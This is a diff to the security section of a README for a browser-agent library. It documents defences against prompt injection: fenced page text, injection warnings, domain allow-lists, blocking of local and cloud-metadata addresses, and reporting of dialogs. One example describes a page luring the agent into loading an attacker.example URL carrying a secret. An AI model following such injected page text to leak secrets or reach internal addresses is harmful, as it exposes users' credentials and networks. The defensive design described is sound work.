@@ -132,6 +132,8 @@ A browser agent reads text written by strangers, and some of it is written for t
 - **Page text is fenced.** Everything page-sourced that goes to a model sits inside `<untrusted_web_content id="…">` with a random id the page cannot guess, so it cannot close the fence early and pose as the user. Every system prompt says fenced text is data.
 - **Suspicious text is reported.** `read()` returns `injection_warnings`, excerpts that read like instructions aimed at an AI. It is a tripwire for you to look at, not a filter.
 - **Domain limits are enforced by the browser.** `Fantoma(allowed_domains=["example.com"])` or `FANTOMA_ALLOWED_DOMAINS` aborts every request to any other host: navigations, frames, scripts, images, fetch calls, redirects and WebSockets. A page that talks the agent into loading `attacker.example/pixel?c=<secret>` sends nothing. `blocked_domains` does the reverse. To see where a redirect goes before following it, requests are fetched through Playwright's own network client while a policy is on, so their network fingerprint is not the browser's. `FANTOMA_DOMAIN_STRICT=0` keeps the browser's networking and gives up redirect checking; a page that ends up on a forbidden host is still left immediately and never read. WebSockets opened inside web workers are not covered.
+- **Local addresses are off limits while a policy is on.** `localhost`, private LAN ranges, link-local and cloud metadata addresses (`169.254.169.254`) are refused unless you name them in `allowed_domains`, so a page cannot steer the agent into your router or your cloud credentials. `file:`, `chrome:` and `view-source:` URLs are refused too.
+- **The HTTP server is closed by default.** Without `FANTOMA_API_KEY` it listens on `127.0.0.1` only, ignores a proxy named in a request body, and accepts browser profiles only under `FANTOMA_PROFILE_BASE`. The Docker image listens on all interfaces because a container must, so set a key there. Saved sessions and form memory are written readable by your user only.
 - **Credentials stay out of prompts.** `sensitive_data={"password": "..."}` shows the model `<secret:password>` and substitutes the real value only when typing.
 - **Block pages are named.** A "Just a moment..." interstitial, a captcha, a 403 or a login wall comes back as `blocked: "bot_challenge"` and so on, instead of being summarised as if it were the page you asked for.
 
@@ -194,6 +196,19 @@ something nobody asked for.
 Verification is fail-open. A task it cannot parse, or a browser that has
 already closed, reports ok rather than inventing a failure, so it can never
 fail a run that actually worked.
+
+Things a page does off-screen are reported too. Every tool action returns
+`notes` alongside `success` and `changed`:
+
+```python
+r = f.click(7)            # a "Delete" button
+r["notes"]                # ['A confirm dialog was dismissed (Cancel): "Delete this item?"']
+```
+
+Dialogs are answered by `FANTOMA_DIALOGS` (`dismiss` by default, `accept` to
+press OK). A tab the site opens, a crashed tab and an HTTP error page are
+reported the same way, and the agent loop shows these notes to the model so it
+does not assume a cancelled action went through.
 
 Over HTTP, pass `keep_session: true` to `/run` to leave the browser on the
 final page and inspect the end state yourself. `steps_detail` returns what the
